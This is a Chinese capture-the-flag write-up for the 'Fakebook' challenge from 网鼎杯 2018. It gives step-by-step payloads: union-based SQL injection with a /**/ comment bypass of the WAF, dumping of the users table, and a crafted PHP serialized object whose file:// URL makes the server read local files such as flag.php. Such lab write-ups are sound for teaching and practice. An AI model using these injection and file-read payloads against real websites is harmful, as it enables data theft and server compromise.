## 基本信息

* 题目名称： [网鼎杯 2018]Fakebook
* 题目链接： https://www.nssctf.cn/problem/20
* 考点清单： sql注入，反序列化
* 工具清单：
* payloads： 无

## 一、看到什么

**题目关键信息列表**：

1. 题目给了一个注册和登录的接口

## 二、想到什么解题思路

1. `view.php`中报错会直接给出提示，存在`sql`注入漏洞的可能。
2. 数据是以序列化形式存储的，表明存在设置相关类的`php`文件，`dirsearch`扫一下看一下目录。

## 三、尝试过程和结果记录

**尝试过程：**

1. 首先需要注册账户，发现乱输入的`blog`会提示不合法，需要输入一个有效的网址。

2. 注册完账户，发现主页面中就出现了注册的用户信息，通过用户名可以点击进入主页。检查源代码可以看到<iframe>中在访问响应`blog`的内容

    ![](images/[网鼎杯%202018]Fakebook-用户页面.png)

3. 上面显示`view.php?no=1`，直接考虑换一些其他的值进行尝试。发现输入2的时候，就出现了报错提示。

    ![](images/[网鼎杯%202018]Fakebook-报错页面.png)

4. 选择`burp`的`sql`关键词爆破，看是否存在`WAF`。响应长度为948的都是提示被过滤的。看样子是过滤了`union select`这样的结构，但是没有单独过滤两个关键词，空格可以使用`/**/`绕过。

    ![](images/[网鼎杯%202018]Fakebook-WAF.png)

5. 先查看有数据表有几列。数字5的时候就提示没有这么多列，故一共4列。
    ```
    ?no=1 order by 4
    ```
6. 找出回显位,这个时候将`no`设置为0，避免把回显位的结果挡住。显示回显位为2。
    ```
    ?no=0 union/**/select 1,2,3,4
    ```
7. 查看相关信息，包括所在数据库，有哪些数据表，有哪些数据库，表有哪些列以及列的值。

    - 所在数据库为`fakebook`

    ```
    ?no=0%20union/**/select%201,database(),3,4
    ```

    - 这个数据库拥有的表名为`users`，且报错提示中有`Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31`，本题应该还和反序列化有关。

    ```
    ?no=0%20union/**/select%201,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
    ```
    - 这个表里有`no`,`username`,`passwd`,`data`这4个属性。
    ```
    ?no=0%20union/**/select%201,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name='users'
    ```
    - 查看所有列的值，再查询单列，发现`data`的数据是以序列化的形式存储的。
    ```
    ?no=0%20union/**/select%201,group_concat(no,username,passwd,data),3,4 from users
    # 结果1testba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:18;s:4:"blog";s:13:"www.baidu.com";} 
    ?no=0%20union/**/select%201,group_concat(data),3,4 from users
    # 结果
     O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:18;s:4:"blog";s:13:"www.baidu.com";} 
    ```
    - 出现的报错提示,意思是`PHP`代码中尝试访问一个非对象的属性（或者一个未初始化的对象）时发生了错误。说明本题还与非序列化有关。
    ```
    Notice: Trying to get property of non-object in /var/www/html/view.php on line 53
    ```
8. 我们使用`dirsearch`扫一下目录,`robots.txt`里面有`37B`的内容，访问一下。提示我们访问如下的内容。
    ```
    User-agent: *
    Disallow: /user.php.bak
    ```
9. 访问一下这个文件，则将这个文件下载下来了。且用`dirsearch`扫描的时候，发现了`0B`的`user.php`的文件。`user.php.bak`这是它的原始备份文件。说明这个文件里面有东西。

10. 查看一下文件内容。它只有`userinfo`一个类，与我们通过`sql`注入查看到的data里的类名相同。`get($url)`会去访问网页，并将网页的部分内容返回。函数接受一个`URL`作为参数，而没有对其进行任何限制或验证。如果攻击者可以控制`$url`，就可以让服务器请求任何指定的地址。猜测相关文件存储在`flag.php`中。使用`file`伪协议来读取文件内容。

11. 构造序列化，得到序列化结果。

    ```php
    <?php
    class UserInfo
    {
        public $name = "";
        public $age = 0;
        public $blog = "file:///var/www/html/view.php";

    }
    echo serialize(new UserInfo());
    # O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/view.php";}
    ```

12. 构造`payload`，可以测试不同的`php`文件，发现flag就存在`flag.php`中。

    ```
    view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
    ```
    ![](images/[网鼎杯%202018]Fakebook-flag.php.png)

    - 点击相应的`ifame`给的`data`协议进行跳转。即可得到最终`flag`。
    ![](images/[网鼎杯%202018]Fakebook-flag.png)

## 四、总结与反思

1. 做到一半没思路的时候，可以访问一下`robots.txt`，或者去扫一下目录等，也许有意想不到的收获。
2. 根据报错提示可以猜测题目的考点。